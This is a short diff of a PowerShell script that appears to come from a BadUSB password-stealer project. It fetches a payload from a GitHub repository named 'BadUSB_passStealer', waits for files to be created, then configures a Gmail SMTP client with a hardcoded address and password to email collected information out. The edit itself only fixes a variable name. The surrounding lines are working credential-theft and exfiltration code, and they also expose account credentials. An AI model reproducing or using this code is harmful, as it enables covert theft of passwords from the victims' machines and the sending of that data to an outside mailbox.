@@ -12,7 +12,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
 #Set mail option
 $SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cntrlcut@gmail.com', 'HeRtAmBiL01') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
